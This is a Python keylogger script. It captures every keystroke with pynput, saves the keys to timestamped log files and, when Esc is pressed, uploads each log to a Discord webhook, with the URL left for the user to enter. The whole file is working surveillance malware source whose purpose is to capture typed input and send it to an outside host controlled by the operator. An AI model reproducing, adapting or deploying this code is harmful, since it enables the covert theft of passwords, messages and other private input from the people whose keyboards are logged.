import datetime
import os

import requests
from pynput.keyboard import Key, Listener

# Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord//enter webhook here before use"

# Directory to store log files
log_directory = "logs"

# Create logs directory if it doesn't exist
if not os.path.exists(log_directory):
    os.makedirs(log_directory)

# Global variable to store keystrokes
keystrokes = []


def on_press(key):
    global keystrokes
    try:
        # Append pressed key to keystrokes list
        keystrokes.append(key.char)
        print(f"Keystroke captured: {key}")
    except AttributeError:
        # Special keys like 'Key.enter', 'Key.space', etc.
        keystrokes.append(str(key))
        print(f"Special key captured: {key}")


def write_to_file():
    global keystrokes
    # Generate unique filename based on timestamp
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    log_file = os.path.join(log_directory, f"keylog_{timestamp}.txt")
    try:
        with open(log_file, "w") as f:
            f.write("".join(keystrokes))
            print(f"Saved keystrokes to file: {log_file}")
        # Send Discord message using webhook
        send_discord_webhook(log_file)
    except Exception as e:
        print(f"Error writing to file: {e}")


def send_discord_webhook(attachment_path):
    files = {'file': open(attachment_path, 'rb')}
    data = {'content': 'Keylogger log file'}
    response = requests.post(DISCORD_WEBHOOK_URL, data=data, files=files)
    print(response.text)  # Print response content for debugging
    if response.status_code == 200:
        print("Log file sent successfully via webhook.")
    else:
        print(f"Failed to send log file via webhook. Status code: {response.status_code}")


def on_release(key):
    if key == Key.esc:
        # Stop the listener
        write_to_file()
        print("Exiting keylogger.")
        return False


# Start the keylogger
print("Keylogger started. Press 'Esc' to stop.")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
